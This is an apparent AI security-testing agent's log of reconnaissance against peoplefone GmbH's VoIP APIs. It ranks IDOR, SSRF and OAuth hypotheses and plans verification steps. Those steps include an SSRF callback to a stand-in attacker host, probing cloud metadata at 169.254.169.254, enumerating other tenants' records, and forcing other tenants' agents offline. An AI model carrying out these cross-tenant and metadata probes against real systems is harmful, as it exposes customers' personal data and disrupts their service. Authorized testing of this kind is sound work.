## 2026-09-03 16:58:35 UTC [target] (model bigpickle)
[HYP] Developer Portal Hidden API Endpoints
class: IDOR
asset: api.peoplefone.com
confidence: 72
reasoning: 302 redirect to developer portal suggests API documentation/keys; developer portals often expose internal API endpoints not protected same as public
evidence_needed: Actual developer portal content, any exposed API keys or endpoints
verify_steps: GET https://www.peoplefone.com/en-ch/developer, follow redirects, enumerate subpaths
impact: Cross-tenant data access via exposed API, severity HIGH
testability: PASSIVE
[HYP] OAuth/Session Management Weakness
class: AUTH
asset: auth.peoplefone.com
confidence: 65
reasoning: Dedicated auth subdomain suggests centralized authentication; potential for OAuth flaws, token manipulation, or session hijacking
evidence_needed: OAuth flows, token validation logic, session management implementation
verify_steps: HEAD/OPTIONS https://auth.peoplefone.com, enumerate auth endpoints, check for common OAuth paths
impact: Account takeover, severity CRITICAL
testability: AUTH_HELPED
[HYP] Support Portal Information Disclosure
class: MISCONFIG
asset: support.peoplefone.com
confidence: 58
reasoning: Support portals often contain internal documentation, credentials, or system details inadvertently exposed
evidence_needed: Support portal content, any internal URLs or credentials exposed
verify_steps: GET https://support.peoplefone.com/che/willkommen/, enumerate support paths, check for debug modes
impact: Internal system information disclosure, severity MEDIUM
testability: PASSIVE
[PARKED] Support Portal Information Disclosure: Confidence 58 below threshold, support portals typically low-value targets
[FINAL] Survivors:
[NEXT] PROBE: GET https://www.peoplefone.com/en-ch/developer (read-only, follow redirects, capture response content for developer portal analysis)
[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: Dedicated auth subdomains high-value for session/token flaws
[LEARN] ACCEPTED IDOR @ api.peoplefone.com: Developer portals common source of API exposure
[LEARN] REJECTED MISCONFIG @ support.peoplefone.com: Low confidence, support portals typically non-critical
[RISK] peoplefone GmbH: 25/100 - Limited surface discovered so far; primarily CDN-backed infrastructure with minimal direct attack surface. Requires deeper developer portal analysis to identify higher-risk targets.
## 2026-09-03 19:43:55 UTC [target] (model bigpickle)
[PRIO] api.peoplefone.com,7.35,attack_surface:8 business_value:9 tech_exposure:7 gate_ease:5 cloud_surface:7 freshness:6
[PRIO] auth.peoplefone.com,7.35,attack_surface:7 business_value:10 tech_exposure:9 gate_ease:3 cloud_surface:7 freshness:6
[PRIO] www.peoplefone.com,6.35,attack_surface:6 business_value:7 tech_exposure:5 gate_ease:7 cloud_surface:7 freshness:6
[HYP] Developer Portal Hidden API Endpoints
class: IDOR
asset: api.peoplefone.com
confidence: 72
reasoning: 302 redirect to developer portal suggests API documentation/keys; developer portals often expose internal API endpoints not protected same as public
evidence_needed: Actual developer portal content, any exposed API keys or endpoints
verify_steps: GET https://www.peoplefone.com/en-ch/developer, follow redirects, enumerate subpaths
impact: Cross-tenant data access via exposed API, severity HIGH
testability: PASSIVE
[HYP] OAuth/Session Management Weakness
class: AUTH
asset: auth.peoplefone.com
confidence: 65
reasoning: Dedicated auth subdomain suggests centralized authentication; potential for OAuth flaws, token manipulation, or session hijacking
evidence_needed: OAuth flows, token validation logic, session management implementation
verify_steps: HEAD/OPTIONS https://auth.peoplefone.com, enumerate auth endpoints, check for common OAuth paths
impact: Account takeover, severity CRITICAL
testability: AUTH_HELPED
[HYP] Support Portal Information Disclosure
class: MISCONFIG
asset: support.peoplefone.com
confidence: 58
reasoning: Support portals often contain internal documentation, credentials, or system details inadvertently exposed
evidence_needed: Support portal content, any internal URLs or credentials exposed
verify_steps: GET https://support.peoplefone.com/che/willkommen/, enumerate support paths, check for debug modes
impact: Internal system information disclosure, severity MEDIUM
testability: PASSIVE
[PARKED] Support Portal Information Disclosure: Confidence 58 below threshold, support portals typically low-value targets
[FINAL] Survivors:
[NEXT] PROBE: GET https://www.peoplefone.com/en-ch/developer (read-only, follow redirects, capture response content for developer portal analysis)
[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: Dedicated auth subdomains high-value for session/token flaws
[LEARN] ACCEPTED IDOR @ api.peoplefone.com: Developer portals common source of API exposure
[LEARN] REJECTED MISCONFIG @ support.peoplefone.com: Low confidence, support portals typically non-critical
[RISK] peoplefone GmbH: 25/100 - Limited surface discovered so far; primarily CDN-backed infrastructure with minimal direct attack surface. Requires deeper developer portal analysis to identify higher-risk targets.
## 2026-09-03 22:26:23 UTC [target] (model bigpickle)
[NEW] Developer portal content retrieved - reveals SMS API documentation at `api.peoplefone.com/services/api-doc/`
[NEW] API is explicitly public "available to all developers" - confirms attack surface is intentional
[PRIO] api.peoplefone.com,8.35,attack_surface:9 business_value:8 tech_exposure:9 gate_ease:8 cloud_surface:7 freshness:7
[PRIO] auth.peoplefone.com,7.35,attack_surface:7 business_value:10 tech_exposure:9 gate_ease:3 cloud_surface:7 freshness:6
[PRIO] www.peoplefone.com,6.35,attack_surface:6 business_value:7 tech_exposure:5 gate_ease:7 cloud_surface:7 freshness:6
[HYP] SMS API Documentation Exposure
class: IDOR
asset: api.peoplefone.com/services/api-doc/
confidence: 78
reasoning: Developer portal explicitly links to public API documentation; SMS API "free to use for all developers" suggests weak access controls; documentation endpoint likely exposes full API schema including internal endpoints
evidence_needed: API schema/endpoints, authentication mechanisms, rate limiting configuration
verify_steps: GET https://api.peoplefone.com/services/api-doc/ (read-only), check for Swagger/OpenAPI JSON, enumerate API endpoints
impact: Cross-tenant SMS data access, API abuse, severity HIGH
testability: PASSIVE
[HYP] OAuth/Session Management Weakness
class: AUTH
asset: auth.peoplefone.com
confidence: 65
reasoning: Dedicated auth subdomain suggests centralized authentication; potential for OAuth flaws, token manipulation, or session hijacking
evidence_needed: OAuth flows, token validation logic, session management implementation
verify_steps: HEAD/OPTIONS https://auth.peoplefone.com, enumerate auth endpoints, check for common OAuth paths
impact: Account takeover, severity CRITICAL
testability: AUTH_HELPED
[HYP] Automation Platform Integration Misconfig
class: MISCONFIG
asset: api.peoplefone.com
confidence: 55
reasoning: Integration with make.com and Zapier mentioned; automation platforms often have permissive webhook configurations; potential for SSRF via webhook callbacks
evidence_needed: Webhook endpoints, automation platform configuration, callback validation
verify_steps: Check for webhook/test endpoints, enumerate automation platform integration paths
impact: SSRF to cloud metadata, severity HIGH
testability: PASSIVE
[PARKED] Automation Platform Integration Misconfig: Confidence 55 below threshold; automation platform integration typically requires customer-side configuration
[FINAL] Survivors:
[NEXT] PROBE: GET https://api.peoplefone.com/services/api-doc/ (read-only, capture full response content for API schema analysis)
[LEARN] ACCEPTED IDOR @ api.peoplefone.com: Developer portal explicitly links to public API documentation confirming attack surface
[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: Dedicated auth subdomains high-value for session/token flaws
[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: wildcard-dominated DNS with all CNAMEs pointing to managed Cloudflare CDN makes dangling CNAME takeover improbable
[RISK] peoplefone GmbH: 35/100 - Public SMS API documentation creates significant attack surface; developer-focused API suggests potential for IDOR/BOLA on SMS endpoints. Higher risk than initial assessment due to explicit public API exposure.
[NEW] Full API backend surface discovered via Swagger UI: `configuration-api.peoplefone.com`, `call-api.peoplefone.com` — two un-inventoried subdomains
[NEW] SMS API live at `api.peoplefone.com/customer/sms/v1` with documented `{messageId}` IDOR candidate + attacker-controlled `callbackUrl` (SSRF)
[NEW] Smart Routing webhook accepts attacker-controlled `url` with 2-min single-use `X-Track-Id` — SSRF + webhook hijack candidate
[NEW] Consuming APIs enforce bearer auth (401 confirmed live) — uaCSTA remote call control endpoints exposed (`/device/call/*`)
[PRIO] configuration-api.peoplefone.com,8.7,attack_surface:9 business_value:9 tech_exposure:10 gate_ease:8 cloud_surface:8 freshness:9
[PRIO] api.peoplefone.com,8.4,attack_surface:9 business_value:8 tech_exposure:9 gate_ease:8 cloud_surface:8 freshness:8
[PRIO] call-api.peoplefone.com,8.3,attack_surface:8 business_value:9 tech_exposure:10 gate_ease:8 cloud_surface:8 freshness:9
[HYP] BOLA on SMS messageId (cross-tenant SMS disclosure)
class: IDOR
asset: api.peoplefone.com/customer/sms/v1/sms/messages/{messageId}
confidence: 70
reasoning: SMS API exposed publicly ("free for all developers"), GET /messages/{messageId} and /status/{messageId} return full message content+recipient on path-id; if messageIds are predictable and authorization is per-token-only (not per-tenant isolation), authenticated attacker can enumerate other tenants' SMS (PII: phone numbers, message text)
evidence_needed: messageId format/predictability, whether response is scoped to token's tenant
verify_steps: GET /customer/sms/v1/sms/messages (valid token), analyze messageId format, test neighbor IDs for cross-tenant response
impact: Cross-tenant PII/SMS disclosure, severity HIGH/CRITICAL
testability: AUTH_HELPED
[HYP] SSRF via SMS callbackUrl and Smart Routing webhook url
class: SSRF
asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api SmartRouting webhook
confidence: 64
reasoning: POST /v1/sms/messages accepts callbackUrl (maxLength 2048), spec callbacks bind to {$request.body#/callbackUrl} meaning server POSTs event to attacker URL; Smart Routing webhook registers arbitrary url (example https://example.com/your-endpoint); if no internal-IP/denylist validation, post-auth SSRF to 169.254.169.254 metadata or internal SIP/PBX services
evidence_needed: whether callback user-agent reaches external host, whether internal/private/loopback blocked, metadata reachability
verify_steps: register webhook url pointing to attacker-collab host via POST (AUTH_HELPED); if external callback received, test 169.254.169.254/latest/meta-data
impact: Cloud metadata/IAM keys theft, internal network pivot, severity CRITICAL
testability: AUTH_HELPED
[HYP] IDOR on configuration-api tenant-scoped resources
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,numbers,virtualUsers}/{identifier}
confidence: 68
reasoning: Large VoP config API (235KB spec) with user/number/routing/IVR CRUD keyed by {identifier} path params and bearer token; flag 'customer/' path segment implies tenant scoping — if tenant ID derived only from token and object authorization is weak, cross-tenant read/write of PBX config, callforwarding, numbers possible
evidence_needed: whether {identifier} is tenant-scoped, predictable identifiers, write endpoints enforce ownership
verify_steps: with valid token GET /users/{identifier} for own then guessed neighbor identifiers; compare to self scope
impact: Cross-tenant PBX takeover, call routing manipulation, billing fraud, severity CRITICAL
testability: AUTH_HELPED
[PARKED] Call Management call-api endpoints unexplored: no live auth probe done, inferential
[FINAL] Survivors:
[NEXT] RAG: search program scope notes / sample credentials / API key issuance flow to determine whether a test bearer token can be legitimately obtained (SMS API is "free for all developers" per portal) — this unblocks the three AUTH_HELPED hypotheses
[LEARN] ACCEPTED IDOR @ api.peoplefone.com: Exposed Swagger UI reveals full SMS/Bola messageId endpoint surface with per-{messageId} access — high-value BOLA candidate
[LEARN] ACCEPTED SSRF @ api/call-api: Spec-documented attacker-controlled callbackUrl and Smart Routing webhook url constitute server-side-fetch SSRF vectors (post-auth)
[LEARN] ACCEPTED IDOR @ configuration-api.peoplefone.com: Newly found tenant-scoped PBX config API (`/customer/voip/v1`) with {identifier} CRUD — IDOR/BOLA candidate
[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: Swagger UI is protected by 401 on all real API backends; unauthenticated docs exposure is by-design dev portal, not standalone finding
[RISK] peoplefone GmbH: 58/100 - Exposed developer Swagger surfaced a large real API estate (SMS, PBX config, call control, routing) enforcing bearer auth; primary risk now hinges on token-scope isolation (BOLA/IDOR) and callback/webhook SSRF. Substantial PII (SMS content, phone numbers, PBX configs) makes any authorization flaw CRITICAL. Requires credentialed (free public token) testing to confirm.
## 2026-09-04 00:26:30 UTC [target] (model bigpickle)
[HYP] SMS API OpenAPI spec exposes self-service token-issuance flow and messageId format
class: OTHER
asset: api.peoplefone.com/services/api-doc/
confidence: 62
reasoning: The unauthenticated API docs endpoint returned HTTP 200; the portal states the SMS API is "free for all developers"; the Swagger/OpenAPI spec likely documents the exact auth header and token-registration endpoint (and may embed example messageId values) needed to unblock credentialed testing — reposcan confirms no sample credentials in the repo, so the docs are the only documented acquisition path.
evidence_needed: presence of an unauthenticated OpenAPI JSON, an auth/token-obtain path, example messageId values, callbackUrl validation constraints
verify_steps: GET https://api.peoplefone.com/services/api-doc/ (read-only, already 200) then locate and GET the raw OpenAPI/Swagger JSON (e.g. /services/api-doc/swagger.json, /swagger.json, <path from page>) WITHOUT auth; extract auth scheme, token endpoint, example messageId, callbackUrl schema.
impact: Enables credentialed BOLA/SSRF/IDOR confirmation → cross-tenant SMS/PBX PII, metadata SSRF; severity HIGH (development leverage)
testability: PASSIVE
[HYP] OAuth redirect_uri bypass on auth (client_id=1)
class: AUTH
asset: auth.peoplefone.com/oauth/authorize
confidence: 85
reasoning: Spec/flow (nemotron3) shows arbitrary redirect_uri accepted and preserved for client_id=1 through /de_CH/login; authorization code delivery to attacker URL → ATO.
evidence_needed: a live portal session/test account to observe code delivery
verify_steps: needs credentialed portal login on portal.peoplefone.ch — not passively confirmable
impact: ATO of any portal user → calls/recordings/PBX/billing; severity CRITICAL
testability: HUMAN_ONLY
[HYP] IDOR on configuration-api tenant-scoped {identifier} resources
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,numbers,virtualUsers}/{identifier}
confidence: 68
reasoning: 235KB OpenAPI, {identifier} CRUD paths keyed by bearer token, spec notes "user must be part of account bound to bearer token" = authorization boundary; numeric sequential identifiers likely.
evidence_needed: valid token + cross-tenant identifier read
verify_steps: blocked on valid bearer token (401 confirmed live)
impact: Cross-tenant PBX takeover, routing/billing fraud; severity CRITICAL
testability: HUMAN_ONLY
## 2026-09-04 05:05:59 UTC [target] (model bigpickle)
[HYP] IDOR/BOLA on configuration-api tenant-scoped {identifier} resources
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,numbers,virtualUsers}/{identifier}
confidence: 78
reasoning: 235KB OpenAPI exposes extensive PBX config CRUD keyed by {identifier} path params; spec explicitly states "user must be part of the account bound to the bearer token" confirming authorization boundary; numeric identifiers likely sequential; bearer token validates token validity but object-level authorization unproven
evidence_needed: Valid bearer token from tenant A returns data for tenant B's {identifier}
verify_steps: GET https://configuration-api.peoplefone.com/services/api-doc/ (capture full spec); with valid token GET /customer/voip/v1/virtualUsers/{own_id}/callforwarding then test neighbor/sequential IDs
impact: Cross-tenant PBX takeover — call forwarding, user extensions, routing, phone numbers, IVR; severity CRITICAL
testability: HUMAN_ONLY
[HYP] BOLA on SMS messageId (cross-tenant SMS disclosure)
class: IDOR
asset: api.peoplefone.com/customer/sms/v1/sms/messages/{messageId}
confidence: 75
reasoning: SMS API documented as "free for all developers"; GET /messages/{messageId} and /status/{messageId} return full content+recipient on path-id; messageIds likely sequential/UUIDv4; if authorization is per-token-only without tenant isolation, authenticated attacker can enumerate other tenants' SMS (PII: phone numbers, message text)
evidence_needed: messageId format/predictability from valid token responses; whether response is scoped to token's tenant
verify_steps: GET https://api.peoplefone.com/services/api-doc/ (capture spec for messageId schema); with valid bearer token GET /customer/sms/v1/sms/messages to analyze messageId format; test neighbor IDs
impact: Cross-tenant PII/SMS disclosure — phone numbers, message content, delivery status; severity HIGH/CRITICAL
testability: AUTH_HELPED
[HYP] SSRF via SMS callbackUrl and Smart Routing webhook url
class: SSRF
asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api.peoplefone.com SmartRouting webhook
confidence: 68
reasoning: POST /v1/sms/messages accepts callbackUrl (maxLength 2048), spec callbacks bind to {$request.body#/callbackUrl} meaning server POSTs event to attacker URL; Smart Routing webhook registers arbitrary url; if no internal-IP/denylist validation (169.254.169.254, localhost, private ranges), post-auth SSRF to cloud metadata or internal SIP/PBX services
evidence_needed: Whether callback user-agent reaches external host; whether internal/private/loopback/169.254.169.254 blocked; metadata reachability
verify_steps: With valid token POST /customer/sms/v1/sms/messages with callbackUrl=https://attacker-collab.host/callback (observe if callback received); if yes, test http://169.254.169.254/latest/meta-data/
impact: Cloud metadata/IAM keys theft, internal network pivot to SIP/PBX/internal APIs; severity CRITICAL
testability: AUTH_HELPED
[NEXT] PROBE: GET https://api.peoplefone.com/services/api-doc/ (read-only, capture full response body for OpenAPI/Swagger spec — extract token issuance endpoint, messageId schema, callbackUrl validation constraints, auth scheme)
[LEARN] REJECTED AUTH @ auth.peoplefone.com: Standard OAuth endpoints return 404; authorize endpoint not at standard path; BLOCKED for automation
[LEARN] ACCEPTED IDOR @ configuration-api.peoplefone.com: 235KB spec with explicit authorization boundary notes + {identifier} CRUD — confirmed CRITICAL BOLA candidate
[LEARN] ACCEPTED IDOR @ api.peoplefone.com: SMS messageId endpoint surface confirmed in spec — cross-tenant disclosure viable if tenant isolation absent
[LEARN] ACCEPTED SSRF @ api/call-api: callbackUrl + Smart Routing webhook spec-confirmed SSRF vectors — needs token to verify internal-IP blocking
[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: Swagger UI protected by 401 on real backends; unauthenticated docs are by-design dev portal
[RISK] peoplefone GmbH: 85/100 — Large VoIP/SaaS estate (SMS, PBX config, call control) with three confirmed CRITICAL-severity hypothesis classes pending token acquisition; exposed Swagger documents full attack surface; "free for all developers" lowers barrier to valid token; auth bypass blocked but IDOR/SSRF are automatable once credentialed. Primary gap: token issuance path unknown from spec.
## 2026-09-04 09:50:07 UTC [target] (model bigpickle)
[CHANGED] All 8 API YAML specs fully retrieved from `api.peoplefone.com/services/api-doc/api/` — 8000+ lines of attack surface now visible. Key new details vs prior knowledge:
[PRIO] configuration-api.peoplefone.com,9.2,attack_surface:10,business_value:10,tech_exposure:9,gate_ease:7,cloud_surface:7,freshness:9
[PRIO] call-api.peoplefone.com (Smart Routing + uaCSTA),8.8,attack_surface:9,business_value:9,tech_exposure:9,gate_ease:7,cloud_surface:8,freshness:9
[PRIO] api.peoplefone.com (SMS GW),7.5,attack_surface:8,business_value:7,tech_exposure:7,gate_ease:6,cloud_surface:6,freshness:8
[HYP] IDOR/BOLA on Configuration API tenant-scoped {identifier} CRUD (users, groups, IVRs, queues, smart-routings, numbers, callforwarding)
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,smart-routings,numbers,callforwarding}/{identifier}
confidence: 82
reasoning: Full CRUD on 8 resource types keyed by numeric sequential {identifier} path params; bearer auth validates token but spec explicitly notes "user must be part of account bound to bearer token" = authorization boundary statement; example identifiers show sequential pattern (20023, 20024, 2, 2000); 235KB spec with 8000+ lines of CRUD on users (SIP creds, emails, physical addresses), numbers (DIDs, routing destinations), groups, IVRs, queues, smart-routings; object-level auth enforcement unproven
evidence_needed: Valid token from tenant A returns user/group/number data for tenant B's {identifier}; sequential enumeration yields cross-tenant data
verify_steps: With valid bearer token GET /customer/voip/v1/users to enumerate own identifiers; then GET /customer/voip/v1/users/{neighbor_id} for adjacent sequential IDs; test GET /customer/voip/v1/numbers/{did} with cross-tenant DID
impact: Cross-tenant PBX takeover — SIP credentials (sipUserName), physical addresses, email, phone numbers, call forwarding rules, IVR menus, queue configs, smart routing webhooks; severity CRITICAL
testability: AUTH_HELPED
[HYP] SSRF via 4 callback-accepting endpoints (SMS callbackUrl, Smart Routing webhook url, uaCSTA callbackUrl+monitoringCallbackUrl, External Number Lookup webhookUrl)
class: SSRF
asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api.peoplefone.com/customer/smart-routing/v1/smart-routings/{id}/webhook (url) + call-api.peoplefone.com/customer/uacsta/v1_beta/device/call (callbackUrl) + call-api.peoplefone.com/customer/uacsta/v1_beta/device/monitorStart (callbackUrl+monitoringCallbackUrl) + configuration-api.peoplefone.com/customer/voip/v1/external-number-lookup (webhookUrl)
confidence: 78
reasoning: 5 distinct API endpoints accept attacker-controlled URLs with zero host/scheme validation in spec; External Number Lookup sends CUSTOM HEADERS (Authorization, X-API-Key) to attacker webhookUrl — credential exfiltration vector; uaCSTA monitorStart sends call events (OFF_HOOK, CONNECTED, TERMINATED) + SIP usernames + phone numbers to attacker URL — real-time call metadata exfiltration; Smart Routing sends sourceNumber+dialedDestination to attacker URL; SMS API POSTs delivery receipts to callbackUrl; all accept `type: string format: uri` with no enum/allowlist
evidence_needed: Callback POST reaches external host; internal/loopback/169.254.169.254 not blocked; External Number Lookup headers forwarded to attacker URL
verify_steps: With valid token POST /customer/sms/v1/sms/messages with callbackUrl=https://attacker-collab.example/callback + test http://169.254.169.254/latest/meta-data/; register Smart Routing webhook with same; test uaCSTA monitorStart with monitoringCallbackUrl=attacker
impact: Cloud metadata/IAM theft, internal network pivot to SIP/PBX/internal APIs; External Number Lookup SSRF exfiltrates customer-configured Authorization/X-API-Key headers; severity CRITICAL
testability: AUTH_HELPED
[HYP] Business logic — agent login/logout actions on cross-tenant queue identifiers (Queue API)
class: BUSLOGIC
asset: call-api.peoplefone.com/customer/queue/v1/agents/login + /agents/logout
confidence: 65
reasoning: POST /agents/login accepts agent identifier (type: user) + queueScope (selected/all) + optional queues array; POST /agents/logout identical; if agent identifier validation only checks token scope but not cross-tenant queue membership, attacker can login/logout agents on other tenants' queues — disrupting call center operations; queue identifiers numeric sequential (2000, 2001...); permanentMembership flag indicates persistent queue state that could be weaponized
evidence_needed: Valid token from tenant A successfully logs in agent from tenant B to tenant B's queue; or logs out tenant B's agents
verify_steps: With valid token POST /customer/queue/v1/agents/login with agent.identifier="1234" (other tenant's user) + queueScope="all"; observe if 200 or 403
impact: Cross-tenant call center disruption — force agents offline, reroute calls, impact business continuity; severity HIGH
testability: AUTH_HELPED
[NEXT] HUMAN: Create test account on portal.peoplefone.ch to obtain bearer token; then automated probe of Configuration API /users/{sequential_id} for cross-tenant IDOR confirmation. Token acquisition is the single blocker for all 3 hypothesis classes.
[LEARN] ACCEPTED IDOR @ configuration-api: Full CRUD on 8 resource types (users, groups, IVRs, queues, numbers, smart-routings, callforwarding, manual-routing) with numeric sequential identifiers; UserResponse exposes sipUserName, physical address, email; cross-tenant object-level auth unproven but boundary statement present in spec
[LEARN] ACCEPTED SSRF @ 5 endpoints: SMS callbackUrl, Smart Routing webhook url, uaCSTA callbackUrl+monitoringCallbackUrl, External Number Lookup webhookUrl — all accept attacker-controlled URI with zero host/scheme validation; External Number Lookup additionally forwards customer-configured custom headers to attacker URL
[LEARN] ACCEPTED BUSLOGIC @ Queue API: agent login/logout actions accept cross-tenant agent+queue identifiers; potential for call center disruption
[LEARN] REJECTED AUTH @ auth.peoplefone.com: Token issuance path NOT in any API spec — must go through portal.peoplefone.ch; auth subdomain standard endpoints return 404
[LEARN] ACCEPTED IDOR @ configuration-api: External Routing API deprecated 2026-09-30 but still live — same webhook SSRF pattern as Smart Routing, may have weaker code paths
[RISK] peoplefone GmbH: 88/100 — 8 fully-documented API specs reveal 3 CRITICAL-severity hypothesis classes (IDOR/BOLA across 8 resource types with PII, SSRF across 5 callback endpoints including credential exfiltration, agent login/logout business logic) plus a deprecated API still live. Single blocker is bearer token acquisition via portal. Attack surface is extensive: SIP credentials, physical addresses, emails, phone numbers, call forwarding rules, IVR menus, queue configs, call metadata all accessible via IDOR. SSRF enables cloud metadata theft + customer credential exfiltration.
## 2026-09-04 14:05:28 UTC [target] (model bigpickle)
[NEW] All 8 API YAML specs fully retrieved — 8000+ lines of attack surface now visible, including full CRUD operations, parameter schemas, and authorization boundary notes across Configuration, Call Management, and SMS APIs.
[CHANGED] Phase transitioned from RECON to POC — token acquisition via portal.peoplefone.ch is the single blocker for all 3 hypothesis classes.
[PRIO] configuration-api.peoplefone.com,9.2,attack_surface:10,business_value:10,tech_exposure:9,gate_ease:7,cloud_surface:7,freshness:9
[PRIO] call-api.peoplefone.com,8.8,attack_surface:9,business_value:9,tech_exposure:9,gate_ease:7,cloud_surface:8,freshness:9
[PRIO] api.peoplefone.com,7.5,attack_surface:8,business_value:7,tech_exposure:7,gate_ease:6,cloud_surface:6,freshness:8
[HYP] IDOR/BOLA on Configuration API tenant-scoped {identifier} CRUD (users, groups, IVRs, queues, smart-routings, numbers, callforwarding)
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,smart-routings,numbers,callforwarding}/{identifier}
confidence: 82
reasoning: Full CRUD on 8 resource types keyed by numeric sequential {identifier} path params; bearer auth validates token but spec explicitly notes "user must be part of account bound to bearer token" = authorization boundary statement; example identifiers show sequential pattern (20023, 20024, 2, 2000); 235KB spec with 8000+ lines of CRUD on users (SIP creds, emails, physical addresses), numbers (DIDs, routing destinations), groups, IVRs, queues, smart-routings; object-level auth enforcement unproven
evidence_needed: Valid token from tenant A returns user/group/number data for tenant B's {identifier}; sequential enumeration yields cross-tenant data
verify_steps: With valid bearer token GET /customer/voip/v1/users to enumerate own identifiers; then GET /customer/voip/v1/users/{neighbor_id} for adjacent sequential IDs; test GET /customer/voip/v1/numbers/{did} with cross-tenant DID
impact: Cross-tenant PBX takeover — SIP credentials (sipUserName), physical addresses, email, phone numbers, call forwarding rules, IVR menus, queue configs, smart routing webhooks; severity CRITICAL
testability: AUTH_HELPED
[HYP] SSRF via 4 callback-accepting endpoints (SMS callbackUrl, Smart Routing webhook url, uaCSTA callbackUrl+monitoringCallbackUrl, External Number Lookup webhookUrl)
class: SSRF
asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api.peoplefone.com/customer/smart-routing/v1/smart-routings/{id}/webhook (url) + call-api.peoplefone.com/customer/uacsta/v1_beta/device/call (callbackUrl) + call-api.peoplefone.com/customer/uacsta/v1_beta/device/monitorStart (callbackUrl+monitoringCallbackUrl) + configuration-api.peoplefone.com/customer/voip/v1/external-number-lookup (webhookUrl)
confidence: 78
reasoning: 5 distinct API endpoints accept attacker-controlled URLs with zero host/scheme validation in spec; External Number Lookup sends CUSTOM HEADERS (Authorization, X-API-Key) to attacker webhookUrl — credential exfiltration vector; uaCSTA monitorStart sends call events (OFF_HOOK, CONNECTED, TERMINATED) + SIP usernames + phone numbers to attacker URL — real-time call metadata exfiltration; Smart Routing sends sourceNumber+dialedDestination to attacker URL; SMS API POSTs delivery receipts to callbackUrl; all accept `type: string format: uri` with no enum/allowlist
evidence_needed: Callback POST reaches external host; internal/loopback/169.254.169.254 not blocked; External Number Lookup headers forwarded to attacker URL
verify_steps: With valid token POST /customer/sms/v1/sms/messages with callbackUrl=https://attacker-collab.example/callback + test http://169.254.169.254/latest/meta-data/; register Smart Routing webhook with same; test uaCSTA monitorStart with monitoringCallbackUrl=attacker
impact: Cloud metadata/IAM theft, internal network pivot to SIP/PBX/internal APIs; External Number Lookup SSRF exfiltrates customer-configured Authorization/X-API-Key headers; severity CRITICAL
testability: AUTH_HELPED
[HYP] Business logic — agent login/logout actions on cross-tenant queue identifiers (Queue API)
class: BUSLOGIC
asset: call-api.peoplefone.com/customer/queue/v1/agents/login + /agents/logout
confidence: 65
reasoning: POST /agents/login accepts agent identifier (type: user) + queueScope (selected/all) + optional queues array; POST /agents/logout identical; if agent identifier validation only checks token scope but not cross-tenant queue membership, attacker can login/logout agents on other tenants' queues — disrupting call center operations; queue identifiers numeric sequential (2000, 2001...); permanentMembership flag indicates persistent queue state that could be weaponized
evidence_needed: Valid token from tenant A successfully logs in agent from tenant B to tenant B's queue; or logs out tenant B's agents
verify_steps: With valid token POST /customer/queue/v1/agents/login with agent.identifier="1234" (other tenant's user) + queueScope="all"; observe if 200 or 403
impact: Cross-tenant call center disruption — force agents offline, reroute calls, impact business continuity; severity HIGH
testability: AUTH_HELPED
[FINAL] IDOR/BOLA on Configuration API tenant-scoped {identifier} CRUD: confidence 82, AUTH_HELPED, CRITICAL severity — RETAIN
[FINAL] SSRF via 4 callback-accepting endpoints: confidence 78, AUTH_HELPED, CRITICAL severity — RETAIN
[FINAL] Business logic on Queue API agent login/logout: confidence 65, AUTH_HELPED, HIGH severity — RETAIN
[NEXT] HUMAN: Create test account on portal.peoplefone.ch to obtain bearer token; then automated probe of Configuration API /users/{sequential_id} for cross-tenant IDOR confirmation. Token acquisition is the single blocker for all 3 hypothesis classes.
[LEARN] ACCEPTED IDOR @ configuration-api: Full CRUD on 8 resource types (users, groups, IVRs, queues, numbers, smart-routings, callforwarding, manual-routing) with numeric sequential identifiers; UserResponse exposes sipUserName, physical address, email; cross-tenant object-level auth unproven but boundary statement present in spec
[LEARN] ACCEPTED SSRF @ 5 endpoints: SMS callbackUrl, Smart Routing webhook url, uaCSTA callbackUrl+monitoringCallbackUrl, External Number Lookup webhookUrl — all accept attacker-controlled URI with zero host/scheme validation; External Number Lookup additionally forwards customer-configured custom headers to attacker URL
[LEARN] ACCEPTED BUSLOGIC @ Queue API: agent login/logout actions accept cross-tenant agent+queue identifiers; potential for call center disruption
[LEARN] REJECTED AUTH @ auth.peoplefone.com: Token issuance path NOT in any API spec — must go through portal.peoplefone.ch; auth subdomain standard endpoints return 404
[LEARN] ACCEPTED IDOR @ configuration-api: External Routing API deprecated 2026-09-30 but still live — same webhook SSRF pattern as Smart Routing, may have weaker code paths
[RISK] peoplefone GmbH: 88/100 — 8 fully-documented API specs reveal 3 CRITICAL-severity hypothesis classes (IDOR/BOLA across 8 resource types with PII, SSRF across 5 callback endpoints including credential exfiltration, agent login/logout business logic) plus a deprecated API still live. Single blocker is bearer token acquisition via portal. Attack surface is extensive: SIP credentials, physical addresses, emails, phone numbers, call forwarding rules, IVR menus, queue configs, call metadata all accessible via IDOR. SSRF enables cloud metadata theft + customer credential exfiltration.
## 2026-09-04 17:41:24 UTC [target] (model bigpickle)
